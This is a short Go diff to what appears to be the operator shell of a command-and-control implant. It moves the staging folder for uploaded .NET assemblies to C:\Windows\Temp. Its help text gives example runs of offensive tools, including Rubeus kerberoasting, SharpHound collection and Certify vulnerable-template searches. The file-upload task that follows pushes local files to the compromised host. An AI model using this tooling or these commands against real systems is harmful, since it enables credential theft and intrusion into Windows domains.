@@ -1520,10 +1520,10 @@ func (sh *Shell) cmdAssembly(args []string) {
 		fmt.Printf("    %sassembly list%s                   List common assemblies\n", colorCyan, colorReset)
 		fmt.Println()
 		Info("Examples:")
-		fmt.Printf("    assembly C:\\Users\\Public\\Seatbelt.exe -group=all\n")
-		fmt.Printf("    assembly C:\\Users\\Public\\Rubeus.exe kerberoast\n")
-		fmt.Printf("    assembly C:\\Users\\Public\\SharpHound.exe -c All\n")
-		fmt.Printf("    assembly C:\\Users\\Public\\Certify.exe find /vulnerable\n")
+		fmt.Printf("    assembly C:\\Windows\\Temp\\Seatbelt.exe -group=all\n")
+		fmt.Printf("    assembly C:\\Windows\\Temp\\Rubeus.exe kerberoast\n")
+		fmt.Printf("    assembly C:\\Windows\\Temp\\SharpHound.exe -c All\n")
+		fmt.Printf("    assembly C:\\Windows\\Temp\\Certify.exe find /vulnerable\n")
 		return
 	}
 
@@ -1532,7 +1532,7 @@ func (sh *Shell) cmdAssembly(args []string) {
 		localPath := args[0]
 		// If it's a local file path, read and upload it
 		if data, err := os.ReadFile(localPath); err == nil {
-			remotePath := "C:\\Users\\Public\\" + filepath.Base(localPath)
+			remotePath := "C:\\Windows\\Temp\\" + filepath.Base(localPath)
 			Info("Uploading %s to %s...", filepath.Base(localPath), remotePath)
 			sh.queueTask(protocol.TaskUpload, []string{remotePath}, data)
 
